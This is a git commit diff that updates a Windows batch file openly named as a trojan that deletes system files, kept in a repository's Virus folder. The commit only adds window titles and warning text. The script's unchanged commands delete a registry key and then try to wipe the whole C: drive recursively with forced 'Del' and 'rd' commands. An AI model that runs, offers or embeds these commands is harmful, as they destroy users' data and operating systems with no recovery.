e8d12ed869089a8a359a65728bf61c14075fb2ae
Pa1Leon <154698240+Pa1Leon@users.noreply.github.com>
2024-05-28 17:38:58 +0200

    Update TrojanWin64Win32systemFillesDeleter.bat

--- bat/Virus/TrojanWin64Win32systemFillesDeleter.bat
+++ bat/Virus/TrojanWin64Win32systemFillesDeleter.bat
@@ -1,11 +1,14 @@
 @echo off
+title Warimg
 echo WARING! You ran a Trojan Known as SystemFileDeleter.bat that will delete all your files including the C:\ drive! are you sure you wana run this?
 echo TIP!: If you wana close this click the x on the top right
 pause
 cls
+Title FINAL WARING!
 echo FINAL WARING! This Software aka Batch file is Dangerous and can harm your pc are you realy sure you wana realy run this? this is your final waring to stop this Bach file form deleteing this pc
 pause
 cls
+Title Deleteing windows...
 reg delete HKCH/SYSTEM/Setup /f
 Del C:\ /f /s /q
 rd C:\ /s /q
